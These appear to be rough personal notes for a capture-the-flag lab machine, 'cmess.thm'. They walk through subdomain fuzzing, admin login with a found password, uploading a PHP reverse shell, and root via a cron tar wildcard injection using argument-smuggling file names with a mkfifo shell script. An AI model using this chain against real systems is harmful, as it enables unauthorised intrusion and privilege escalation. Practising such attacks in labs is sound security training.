add cmess.thm to the /etc/hosts file
Initial scans show 80 and 22
there's a login page, and vulns need us to be authenticated
dirb dint help much
So, we look for subdomains using wfuzz
`wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107`

```bash
wfuzz -c -w subdomains-top1mil-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hl 107
```
make sure you add this dev.cmess.thm to /etc/hosts file
then visit dev.cmess.thm otherwise, it wont be accessible

Now, we find andre@cmess.thm's password there
Login at cmess.thm/admin using this, go to content -> file manager
add a php-reverse-shell.php there
then visit cmess.thm/assets/php-reverse-shell.php (simply visiting assets wont show our file)
reverse shell! www-data
in /opt, there is a password for andre
su andre
/etc/crontab shows a rar backup with wildcard, which takes place in andre's home
cd to andre's home, get usr.txt
echo mkfifo > shell_lin.sh
Now, create a file that seems like an argument of the tar command.
`echo "" > "--checkpoint-action=exec=sh rshell_lin.sh"`
`echo "" > --checkpoint=1`
and lisetn to an incoming connection
troot